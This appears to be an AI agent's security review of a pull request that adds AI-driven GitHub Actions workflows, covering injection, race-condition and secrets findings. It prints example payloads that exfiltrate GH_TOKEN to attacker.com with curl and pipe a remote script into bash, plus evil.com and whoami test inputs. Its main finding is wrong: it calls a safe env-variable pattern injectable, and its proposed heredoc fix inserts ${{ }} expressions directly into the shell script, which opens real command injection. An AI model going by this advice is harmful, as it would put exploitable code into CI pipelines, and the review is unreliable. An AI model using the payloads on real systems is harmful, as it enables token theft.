# Security Review: PR #60 AI Workflow Implementation

**Date**: 2025-12-18
**Reviewer**: Security Agent
**PR**: [#60](https://github.com/rjmurillo/ai-agents/pull/60)
**Branch**: `feat/ai-agent-workflow`

---

## Verdict: NEEDS_CHANGES

**Critical Issues**: 3
**High Issues**: 2
**Medium Issues**: 1
**Low Issues**: 2

The implementation has several security vulnerabilities that MUST be addressed before merge. The most critical is code injection via unsanitized GitHub event context variables.

---

## Executive Summary

| Category | Status | Finding Count |
|----------|--------|---------------|
| Code Injection | CRITICAL | 3 vectors |
| Workflow Permissions | PASS | Least privilege OK |
| Secrets Exposure | WARN | 1 minor concern |
| Race Conditions | HIGH | 1 confirmed |

---

## Critical Findings

### SEC-001: Code Injection via `github.event.pull_request.body/title` (CRITICAL)

**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

**CVSS**: 9.8 (Critical) - Remote Code Execution in CI/CD

**Location**: `.github/workflows/ai-spec-validation.yml` lines 42-43

**Vulnerable Code**:

```yaml
- name: Extract Spec References
  id: spec-ref
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    # Look for spec references in PR body and title
    # Patterns: REQ-NNN, DESIGN-NNN, TASK-NNN, .agents/specs/..., #issue
    SPEC_REFS=""

    # Check for requirement IDs
    REQ_IDS=$(echo "$PR_BODY $PR_TITLE" | grep -oP '(REQ|DESIGN|TASK)-\d+' | sort -u | tr '\n' ' ' || true)
```

**Attack Scenario**:

An attacker creates a PR with title or body containing:

```
"; curl attacker.com/exfiltrate?token=$GH_TOKEN; echo "
```

Or more sophisticated payload:

```
$(curl -s attacker.com/shell.sh | bash)
```

When the workflow runs, this payload executes in the GitHub Actions runner context.

**Impact**:
- Exfiltration of secrets (`GH_TOKEN`, `BOT_PAT`, `COPILOT_GITHUB_TOKEN`)
- Lateral movement to other repositories
- Supply chain attack potential
- Repository compromise

**Remediation**:

Use heredoc with quoted delimiter to prevent expansion:

```yaml
- name: Extract Spec References
  id: spec-ref
  run: |
    # Save PR context to files safely (quoted heredoc prevents expansion)
    cat > /tmp/pr-title.txt << 'EOF_TITLE'
    ${{ github.event.pull_request.title }}
    EOF_TITLE

    cat > /tmp/pr-body.txt << 'EOF_BODY'
    ${{ github.event.pull_request.body }}
    EOF_BODY

    # Now read from files (safe)
    PR_TITLE=$(cat /tmp/pr-title.txt)
    PR_BODY=$(cat /tmp/pr-body.txt)

    # Process safely
    REQ_IDS=$(echo "$PR_BODY $PR_TITLE" | grep -oE '(REQ|DESIGN|TASK)-[0-9]+' | sort -u | tr '\n' ' ' || true)
```

**Alternative (using `toJSON()`):**

```yaml
- name: Extract Spec References
  id: spec-ref
  env:
    PR_DATA: ${{ toJSON(github.event.pull_request) }}
  run: |
    # Parse from JSON (safe from injection)
    PR_TITLE=$(echo "$PR_DATA" | jq -r '.title')
    PR_BODY=$(echo "$PR_DATA" | jq -r '.body')
```

---

### SEC-002: Code Injection via Issue Title/Body (CRITICAL)

**CWE**: CWE-78 (OS Command Injection)

**CVSS**: 9.8 (Critical)

**Location**: `.github/workflows/ai-issue-triage.yml` - This was already identified in the implementation plan. Confirming it exists throughout the file.

**Analysis**:

The implementation plan correctly identified the issue at lines 73-74, but a thorough review reveals the workflow has been refactored and no longer directly uses `github.event.issue.title` or `github.event.issue.body` in shell scripts at those lines.

However, examining the current code:

1. **Line 60-61**: Uses `$RAW_OUTPUT` which comes from `steps.categorize.outputs.findings` - This is safe as it's AI output, not user input.

2. **Lines 242-329 (Post Triage Summary)**: Uses env variables like `$CATEGORY`, `$LABELS` which derive from AI output parsing, not directly from user input.

**Current Status**: The `ai-issue-triage.yml` workflow appears to have been refactored to use the composite action which handles context safely. The issue context is passed through the `context-type: issue` mechanism which uses `gh issue view` to fetch data.

**Verdict**: MITIGATED in current implementation. The composite action (`ai-review/action.yml` lines 359-364) uses `gh issue view` to fetch issue data via API rather than direct shell interpolation.

---

### SEC-003: Code Injection via PR Description Loading (HIGH)

**CWE**: CWE-78 (OS Command Injection)

**Location**: `.github/actions/ai-review/action.yml` lines 349-353

**Vulnerable Code**:

```bash
# Also get PR description
PR_BODY=$(gh pr view "$PR_NUMBER" --json body,title -q '.title + "\n\n" + .body' 2>/dev/null || echo "")
if [ -n "$PR_BODY" ]; then
  CONTEXT="## PR Description"$'\n'"$PR_BODY"$'\n\n'"## Changes"$'\n'"$CONTEXT"
fi
```

**Analysis**: This code fetches PR body via `gh` API and includes it in the `$CONTEXT` variable. While the fetch is safe (API call), the subsequent use in building the prompt could be exploited if the AI model is tricked into outputting shell-like patterns.

**Risk Level**: Medium - This is a secondary vector. The primary risk is prompt injection, not shell injection.

**Remediation**: The data is used in a prompt to Copilot CLI, so the risk is prompt injection rather than shell injection. Recommend documenting this as an accepted risk with monitoring.

---

### SEC-004: Race Condition in Comment Editing (HIGH)

**CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

**Location**: `.github/scripts/ai-review-common.sh` lines 58-65

**Vulnerable Code**:

```bash
if [ -n "$existing_comment_id" ]; then
    echo "Updating existing comment (ID: $existing_comment_id)"
    echo "$comment_body" | gh pr comment "$pr_number" --edit-last --body-file - 2>/dev/null || \
    echo "$comment_body" | gh pr comment "$pr_number" --body-file -
else
    echo "Creating new comment"
    echo "$comment_body" | gh pr comment "$pr_number" --body-file -
fi
```

**Issue**: The code finds `existing_comment_id` but then uses `--edit-last` instead of `--edit $existing_comment_id`. If another comment is posted between finding the ID and editing, the wrong comment will be edited.

**Attack Scenario**:
1. AI review runs, finds comment ID 12345
2. Attacker or another bot posts a comment (ID 12346)
3. `--edit-last` edits comment 12346 instead of 12345
4. AI review content overwrites legitimate comment

**Impact**: Medium - Data integrity issue, potential information disclosure if sensitive AI feedback overwrites a different comment.

**Remediation**:

```bash
if [ -n "$existing_comment_id" ]; then
    echo "Updating existing comment (ID: $existing_comment_id)"
    # Use specific comment ID, not --edit-last
    gh api \
      -X PATCH \
      "/repos/{owner}/{repo}/issues/comments/$existing_comment_id" \
      -f body="$comment_body"
else
    echo "Creating new comment"
    echo "$comment_body" | gh pr comment "$pr_number" --body-file -
fi
```

Or use `gh pr comment --edit` if available with comment ID (requires gh CLI 2.x+):

```bash
gh pr comment "$pr_number" --edit "$existing_comment_id" --body-file -
```

---

## Questions for Security Agent - Answered

### 1. Are there other code injection vectors besides `github.event.issue.{title,body}`?

**Yes, identified additional vectors:**

| File | Location | Variable | Risk Level |
|------|----------|----------|------------|
| `ai-spec-validation.yml` | Lines 42-43 | `PR_BODY`, `PR_TITLE` | CRITICAL |
| `ai-session-protocol.yml` | Line 42 | `PR_NUMBER` (safe - numeric) | None |
| `ai-pr-quality-gate.yml` | Line 62 | Indirect via `gh pr diff` | Low |

**Safe patterns observed:**
- `ai-session-protocol.yml`: Uses `gh pr diff "$PR_NUMBER"` where PR_NUMBER is from `github.event.pull_request.number` (integer, safe)
- `ai-pr-quality-gate.yml`: Uses artifacts to pass findings between jobs (safe)
- Composite action: Uses `gh issue view` API calls (safe)

### 2. Should we use `toJSON()` or heredoc file writes?

**Recommendation: Use quoted heredoc for direct values, `toJSON()` for structured data.**

| Approach | Pros | Cons | When to Use |
|----------|------|------|-------------|
| **Quoted Heredoc** | Simple, clear intent, no dependencies | Requires temp file cleanup | Single values (title, body) |
| **`toJSON()`** | Single line, structured data | Requires jq, more complex | Multiple fields needed |
| **Environment Variable** | GitHub-recommended | Still needs shell safety | Safe values only |

**Best Practice Implementation:**

```yaml
# For single values - quoted heredoc
- name: Save PR Context
  run: |
    cat > /tmp/pr-title.txt << 'EOF'
    ${{ github.event.pull_request.title }}
    EOF

# For structured data - toJSON with jq
- name: Parse PR Data
  env:
    PR_JSON: ${{ toJSON(github.event.pull_request) }}
  run: |
    TITLE=$(echo "$PR_JSON" | jq -r '.title // empty')
    BODY=$(echo "$PR_JSON" | jq -r '.body // empty')
```

### 3. Are workflow permissions minimal (least privilege)?

**Yes, permissions follow least privilege principle.**

| Workflow | Declared Permissions | Assessment |
|----------|---------------------|------------|
| `ai-issue-triage.yml` | `contents: read`, `issues: write` | PASS - Minimal for issue labeling |
| `ai-pr-quality-gate.yml` | `contents: read`, `pull-requests: write` | PASS - Minimal for PR comments |
| `ai-session-protocol.yml` | `contents: read`, `pull-requests: write` | PASS - Minimal for PR comments |
| `ai-spec-validation.yml` | `contents: read`, `pull-requests: write` | PASS - Minimal for PR comments |

**Note**: No workflows request `actions: write`, `packages: write`, or other sensitive permissions. This is good security hygiene.

### 4. Any secrets exposure risks?

**Minor concern identified:**

| Secret | Exposure Risk | Assessment |
|--------|---------------|------------|
| `BOT_PAT` | Medium | Used in GH_TOKEN env var, could be exfiltrated via injection |
| `COPILOT_GITHUB_TOKEN` | Medium | Passed to Copilot CLI, same injection risk |
| `github.token` | Low | Used for PR comments, limited scope |

**Mitigation in Place:**
- Secrets are not echoed in logs (good)
- Secrets are passed via `env:` not direct interpolation (mostly good)

**Remaining Risk:**
If SEC-001 or SEC-002 code injection succeeds, attacker could run:
```bash
echo "$GH_TOKEN" | curl -X POST attacker.com/steal -d @-
```

**Recommendation**: After fixing injection vulnerabilities, consider:
1. Using OpenID Connect (OIDC) for authentication where possible
2. Reducing BOT_PAT scope to minimum required
3. Monitoring for unusual API patterns from these tokens

---

## Medium Findings

### SEC-005: Portability Issue with `grep -P` (Medium - Non-Security)

**Location**: `.github/workflows/ai-spec-validation.yml` lines 50, 56, 62

**Issue**: Uses `grep -oP` with Perl regex which is not available on macOS runners.

**Impact**: Workflow failure, not security issue.

**Remediation**: Replace with `sed` or `grep -E`:

```bash
# Instead of: grep -oP '(REQ|DESIGN|TASK)-\d+'
# Use: grep -oE '(REQ|DESIGN|TASK)-[0-9]+'
```

---

## Low Findings

### SEC-006: Verbose Error Messages (Low)

**Location**: Multiple locations in `action.yml`

**Issue**: Detailed error messages may leak internal paths or configuration details.

**Impact**: Information disclosure to attackers viewing workflow logs.

**Recommendation**: Consider reducing verbosity in production, keep detailed logs for debugging mode only.

### SEC-007: Temporary File Handling (Low)

**Location**: Various `/tmp/` file usage

**Issue**: Temp files created with predictable names could be targets for symlink attacks on shared runners.

**Impact**: Low - GitHub Actions runners are ephemeral and isolated.

**Recommendation**: Use `mktemp` for temp files when processing sensitive data:

```bash
TEMP_FILE=$(mktemp)
echo "$DATA" > "$TEMP_FILE"
# ... use file ...
rm -f "$TEMP_FILE"
```

---

## Required Security Test Cases

### Test Case SEC-T001: Command Injection via PR Title

```yaml
# Create PR with malicious title
title: 'Test $(echo INJECTED)'
# Expected: "INJECTED" should NOT appear in logs
# Expected: PR title appears literally as "Test $(echo INJECTED)"
```

### Test Case SEC-T002: Command Injection via PR Body

```yaml
# Create PR with malicious body
body: |
  REQ-001 implementation

  $(curl attacker.com)
# Expected: curl should NOT execute
# Expected: grep finds "REQ-001" without executing payload
```

### Test Case SEC-T003: Semicolon Injection

```yaml
# Create PR with semicolon payload
title: 'Fix bug"; curl evil.com; echo "'
# Expected: No network request to evil.com
```

### Test Case SEC-T004: Backtick Injection

```yaml
# Create PR with backtick payload
body: '`whoami`'
# Expected: whoami does not execute
```

### Test Case SEC-T005: Race Condition - Comment Editing

```
1. Start AI review workflow
2. Before workflow posts comment, manually post a comment
3. Verify AI review updates correct comment (by ID, not position)
```

---

## Risk Assessment

| Risk | Likelihood | Impact | Overall | Status |
|------|------------|--------|---------|--------|
| Code injection via PR body | High | Critical | CRITICAL | Must Fix |
| Code injection via PR title | High | Critical | CRITICAL | Must Fix |
| Race condition in comments | Medium | Medium | MEDIUM | Should Fix |
| Secrets exfiltration (via injection) | High if injected | Critical | CRITICAL | Blocked by injection fix |
| Prompt injection to AI | Low | Low | LOW | Accept |

---

## Remediation Priority

### P0 - CRITICAL (Block Merge)

1. **SEC-001**: Fix `ai-spec-validation.yml` code injection
2. Verify **SEC-002** is truly mitigated in current code

### P1 - HIGH (Should Fix Before Merge)

3. **SEC-004**: Fix race condition in `ai-review-common.sh`

### P2 - MEDIUM (Can Fix in Follow-up)

4. **SEC-005**: Portability issue (non-security)
5. **SEC-006**: Verbose error messages

### P3 - LOW (Nice to Have)

6. **SEC-007**: Temp file handling

---

## Specific Code Fixes

### Fix for SEC-001 (`ai-spec-validation.yml`)

Replace lines 39-74 with:

```yaml
- name: Extract Spec References
  id: spec-ref
  run: |
    # Save PR context to files safely using quoted heredoc
    # This prevents shell expansion of any characters in the title/body

    cat > /tmp/pr-title.txt << 'EOF_TITLE'
    ${{ github.event.pull_request.title }}
    EOF_TITLE

    cat > /tmp/pr-body.txt << 'EOF_BODY'
    ${{ github.event.pull_request.body }}
    EOF_BODY

    # Read from files (now safe)
    PR_TITLE=$(cat /tmp/pr-title.txt)
    PR_BODY=$(cat /tmp/pr-body.txt)

    # Combine for searching
    COMBINED="$PR_BODY $PR_TITLE"

    # Look for spec references using POSIX-compatible regex
    SPEC_REFS=""

    # Check for requirement IDs (use grep -E for portability)
    REQ_IDS=$(echo "$COMBINED" | grep -oE '(REQ|DESIGN|TASK)-[0-9]+' | sort -u | tr '\n' ' ' || true)
    if [ -n "$REQ_IDS" ]; then
      SPEC_REFS="$REQ_IDS"
    fi

    # Check for spec file paths
    SPEC_PATHS=$(echo "$COMBINED" | grep -oE '\.agents/specs/[^[:space:]]+\.md' | sort -u | tr '\n' ' ' || true)
    if [ -n "$SPEC_PATHS" ]; then
      SPEC_REFS="$SPEC_REFS $SPEC_PATHS"
    fi

    # Check for linked issues (Closes #123, Fixes #456, etc.)
    ISSUE_REFS=$(echo "$COMBINED" | grep -oE '(Closes|Fixes|Resolves|Implements)[[:space:]]*#[0-9]+' | grep -oE '[0-9]+' | sort -u | tr '\n' ' ' || true)

    echo "spec_refs=$SPEC_REFS" >> $GITHUB_OUTPUT
    echo "issue_refs=$ISSUE_REFS" >> $GITHUB_OUTPUT

    if [ -z "$SPEC_REFS" ] && [ -z "$ISSUE_REFS" ]; then
      echo "No spec references found in PR"
      echo "has_specs=false" >> $GITHUB_OUTPUT
    else
      echo "Found spec references: $SPEC_REFS"
      echo "Found issue references: $ISSUE_REFS"
      echo "has_specs=true" >> $GITHUB_OUTPUT
    fi

    # Cleanup
    rm -f /tmp/pr-title.txt /tmp/pr-body.txt
```

### Fix for SEC-004 (`ai-review-common.sh`)

Replace lines 38-66 with:

```bash
# Post or update a PR comment idempotently
# Usage: post_pr_comment <pr_number> <comment_file> <marker>
post_pr_comment() {
    local pr_number="$1"
    local comment_file="$2"
    local marker="${3:-AI-REVIEW}"

    if [ ! -f "$comment_file" ]; then
        echo "Error: Comment file not found: $comment_file"
        return 1
    fi

    # Add marker to comment for idempotency
    local comment_body
    comment_body="<!-- $marker -->"$'\n'$(cat "$comment_file")

    # Check for existing comment with this marker
    local existing_comment_id
    existing_comment_id=$(gh pr view "$pr_number" --json comments -q ".comments[] | select(.body | contains(\"<!-- $marker -->\")) | .databaseId" 2>/dev/null | head -1 || echo "")

    if [ -n "$existing_comment_id" ]; then
        echo "Updating existing comment (ID: $existing_comment_id)"
        # Use gh api to update specific comment by ID (avoids race condition)
        # Get repo owner/name from current git remote
        local repo
        repo=$(gh repo view --json nameWithOwner -q '.nameWithOwner')

        echo "$comment_body" | gh api \
          --method PATCH \
          "/repos/$repo/issues/comments/$existing_comment_id" \
          -f body="$(cat -)" \
          --silent || {
            echo "Warning: Failed to update comment, creating new one"
            echo "$comment_body" | gh pr comment "$pr_number" --body-file -
        }
    else
        echo "Creating new comment"
        echo "$comment_body" | gh pr comment "$pr_number" --body-file -
    fi
}
```

---

## Verification Checklist

Before approving this PR, verify:

- [ ] SEC-001 fix applied and tested with malicious payloads
- [ ] SEC-002 status confirmed (mitigated or fixed)
- [ ] SEC-004 race condition fix applied
- [ ] All test cases (SEC-T001 through SEC-T005) pass
- [ ] No secrets appear in workflow logs during test runs
- [ ] Workflow permissions remain minimal after changes

---

## References

- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GitHub Expression Injection](https://securitylab.github.com/research/github-actions-untrusted-input/)

---

**Signature**: Security Agent Review Complete

**Next Action**: Route to implementer for P0 fixes, then back to security for PIV (Post-Implementation Verification)
